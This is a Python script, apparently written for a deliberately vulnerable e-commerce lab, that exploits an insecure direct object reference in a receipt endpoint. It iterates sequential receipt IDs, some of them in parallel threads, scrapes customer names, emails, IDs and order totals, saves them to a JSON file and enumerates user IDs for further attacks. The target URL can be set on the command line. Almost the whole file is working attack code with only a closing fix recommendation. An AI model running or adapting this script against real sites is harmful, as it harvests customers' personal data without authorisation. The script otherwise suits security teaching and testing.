#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object References) Exploitation Script
Demonstrates how to exploit the receipt viewing vulnerability.
"""

import requests
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

class IDORTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_receipt_idor(self, start_id=1, end_id=20):
        """Test IDOR vulnerability in receipt endpoint"""
        print(f"[*] Testing IDOR vulnerability in receipts (IDs {start_id}-{end_id})...")
        
        found_receipts = []
        
        for receipt_id in range(start_id, end_id + 1):
            url = f"{self.base_url}/receipt/{receipt_id}"
            
            try:
                response = self.session.get(url)
                
                if response.status_code == 200 and "Receipt not found" not in response.text:
                    # Extract customer information from the response
                    customer_info = self.extract_customer_info(response.text)
                    found_receipts.append({
                        'receipt_id': receipt_id,
                        'customer_info': customer_info,
                        'url': url
                    })
                    
                    print(f"[+] Found receipt #{receipt_id}: {customer_info.get('name', 'Unknown')} - {customer_info.get('email', 'No email')}")
                else:
                    print(f"[-] Receipt #{receipt_id}: Not found")
                    
            except Exception as e:
                print(f"[!] Error accessing receipt #{receipt_id}: {e}")
        
        return found_receipts
    
    def extract_customer_info(self, html_content):
        """Extract customer information from receipt HTML"""
        import re
        
        customer_info = {}
        
        # Extract customer name
        name_match = re.search(r'<strong>Name:</strong>\s*([^<]+)', html_content)
        if name_match:
            customer_info['name'] = name_match.group(1).strip()
        
        # Extract email
        email_match = re.search(r'<strong>Email:</strong>\s*([^<]+)', html_content)
        if email_match:
            customer_info['email'] = email_match.group(1).strip()
        
        # Extract customer ID
        id_match = re.search(r'<strong>Customer ID:</strong>\s*([^<]+)', html_content)
        if id_match:
            customer_info['customer_id'] = id_match.group(1).strip()
        
        # Extract order total
        total_match = re.search(r'<strong>\$([^<]+)</strong>', html_content)
        if total_match:
            customer_info['total'] = total_match.group(1).strip()
        
        return customer_info
    
    def parallel_idor_test(self, start_id=1, end_id=100, threads=10):
        """Test IDOR with multiple threads for faster enumeration"""
        print(f"[*] Starting parallel IDOR test with {threads} threads...")
        
        found_receipts = []
        
        def test_single_receipt(receipt_id):
            url = f"{self.base_url}/receipt/{receipt_id}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200 and "Receipt not found" not in response.text:
                    customer_info = self.extract_customer_info(response.text)
                    return {
                        'receipt_id': receipt_id,
                        'customer_info': customer_info,
                        'url': url
                    }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_id = {executor.submit(test_single_receipt, i): i for i in range(start_id, end_id + 1)}
            
            for future in as_completed(future_to_id):
                result = future.result()
                if result:
                    found_receipts.append(result)
                    print(f"[+] Found receipt #{result['receipt_id']}: {result['customer_info'].get('name', 'Unknown')}")
        
        return found_receipts
    
    def generate_report(self, receipts):
        """Generate a report of found receipts"""
        print("\n" + "="*60)
        print("IDOR VULNERABILITY REPORT")
        print("="*60)
        
        if not receipts:
            print("No accessible receipts found.")
            return
        
        print(f"Found {len(receipts)} accessible receipts:")
        print()
        
        for receipt in receipts:
            print(f"Receipt ID: #{receipt['receipt_id']}")
            print(f"URL: {receipt['url']}")
            print(f"Customer: {receipt['customer_info'].get('name', 'Unknown')}")
            print(f"Email: {receipt['customer_info'].get('email', 'No email')}")
            print(f"Customer ID: {receipt['customer_info'].get('customer_id', 'Unknown')}")
            if 'total' in receipt['customer_info']:
                print(f"Order Total: ${receipt['customer_info']['total']}")
            print("-" * 40)
        
        # Save to file
        with open('idor_results.json', 'w') as f:
            json.dump(receipts, f, indent=2)
        
        print(f"\nResults saved to: idor_results.json")
        print("\nSECURITY IMPACT:")
        print("- Customer PII exposed (names, emails)")
        print("- Purchase history accessible")
        print("- Business intelligence leak")
        print("- Privacy violation")
    
    def test_user_enumeration(self):
        """Test if user IDs can be enumerated through IDOR"""
        print("\n[*] Testing user enumeration through IDOR...")
        
        # Try to find patterns in customer IDs from receipts
        receipts = self.test_receipt_idor(1, 10)
        
        user_ids = []
        for receipt in receipts:
            customer_id = receipt['customer_info'].get('customer_id')
            if customer_id and customer_id.isdigit():
                user_ids.append(int(customer_id))
        
        if user_ids:
            print(f"[+] Found user IDs: {sorted(set(user_ids))}")
            print("[!] These user IDs could be used for further attacks")
        else:
            print("[-] No clear user ID pattern found")

def main():
    print("="*60)
    print("IDOR (Insecure Direct Object References) Testing Tool")
    print("Target: Vulnerable E-Commerce Lab - Receipt Endpoint")
    print("="*60)
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:5000"
    
    tester = IDORTester(base_url)
    
    print("[*] Starting IDOR vulnerability assessment...")
    
    # Test sequential access
    receipts = tester.test_receipt_idor(1, 20)
    
    # Generate report
    tester.generate_report(receipts)
    
    # Test user enumeration
    tester.test_user_enumeration()
    
    print("\n" + "="*60)
    print("IDOR testing complete!")
    print("Recommendation: Implement proper access controls and user authorization.")
    print("="*60)

if __name__ == "__main__":
    main()
